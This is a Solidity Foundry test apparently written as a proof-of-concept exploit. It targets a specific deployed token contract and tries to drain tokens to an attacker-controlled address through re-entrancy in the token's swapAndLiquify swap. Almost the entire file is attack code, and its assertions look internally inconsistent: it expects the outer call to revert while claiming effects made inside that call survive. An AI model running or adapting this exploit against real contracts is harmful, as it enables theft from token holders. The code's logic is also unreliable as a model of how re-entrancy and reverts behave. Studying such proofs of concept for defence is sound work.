pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface LiquidityGeneratorToken is IERC20 {
    function uniswapV2Router() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);
    LiquidityGeneratorToken private token;
    IUniswapV2Router02 private router;
    IWETH private weth;
    uint256 private amountToSteal;
    bool private isAttacking;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(address(this), 100 ether);
        token = LiquidityGeneratorToken(TARGET);
        router = IUniswapV2Router02(token.uniswapV2Router());
        weth = IWETH(router.WETH());

        // Provide initial liquidity for the swap to succeed
        uint256 initialTokenAmount = 1_000_000 * 1e9;
        uint256 initialEthAmount = 10 ether;
        deal(address(token), address(this), initialTokenAmount);
        weth.deposit{value: initialEthAmount}();
        token.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        router.addLiquidity(
            address(token),
            address(weth),
            initialTokenAmount,
            initialEthAmount,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Attacker's initial token holdings for the exploit
        amountToSteal = 100_000 * 1e9;
        deal(address(token), address(this), amountToSteal);

        // Arm the swapAndLiquify mechanism
        // numTokensSellToAddToLiquidity is in storage slot 20
        uint256 numTokensToLiquify = uint256(vm.load(TARGET, bytes32(uint256(20))));
        token.transfer(TARGET, numTokensToLiquify);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xE2C9C976337357369845c761DD851E2B6942D69f).balanceOf(address(this));
        isAttacking = true;

        // The balance of our profit-taker address before the attack.
        uint256 beefBalanceBefore = token.balanceOf(address(0xbeef));

        // This call will trigger swapAndLiquify and the re-entrancy.
        // We expect it to revert because we drain our balance in the re-entrant call,
        // causing the balance subtraction of this outer call to fail from an underflow.
        vm.expectRevert();
        token.transfer(address(0xdead), amountToSteal);

        // Check that even though the call reverted, the re-entrant transfer succeeded.
        uint256 beefBalanceAfter = token.balanceOf(address(0xbeef));
        assertGt(beefBalanceAfter, beefBalanceBefore);

        uint256 finalBalance = IERC20(0xE2C9C976337357369845c761DD851E2B6942D69f).balanceOf(address(this));
        assertGt(finalBalance, initialBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        if (isAttacking) {
            isAttacking = false;
            // Re-entrant call to transfer our entire balance before it's debited by the outer call.
            token.transfer(address(0xbeef), amountToSteal);
        }
    }
}

